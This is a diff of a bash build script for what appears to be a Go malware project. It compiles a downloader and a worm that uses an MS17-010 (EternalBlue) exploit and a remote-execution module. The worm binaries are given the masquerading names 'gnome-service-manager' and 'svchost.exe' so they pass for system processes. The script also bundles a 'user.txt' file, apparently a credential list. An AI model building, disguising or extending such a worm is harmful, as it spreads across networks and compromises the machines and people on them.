@@ -1,12 +1,12 @@
 #!/bin/bash
-if [ ! -d ./dist ]; then
-    mkdir -p ./dist
-fi
+rm -rf ./dist
+rm file.zip
+mkdir -p dist
 
 GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/lindown downloader.go
-GOOS=windows GOARCH=386 go build -o ./dist/windown.exe downloader.go pysexec.go
+GOOS=windows GOARCH=386 go build -o ./dist/windown.exe downloader.go
 
-GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/gnome-service-manager worm.go ms17_010.go
+GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/gnome-service-manager worm.go ms17_010.go pysexec.go
 GOOS=windows GOARCH=386 go build -o ./dist/svchost.exe worm.go ms17_010.go pysexec.go
 
 cp user.txt ./dist/
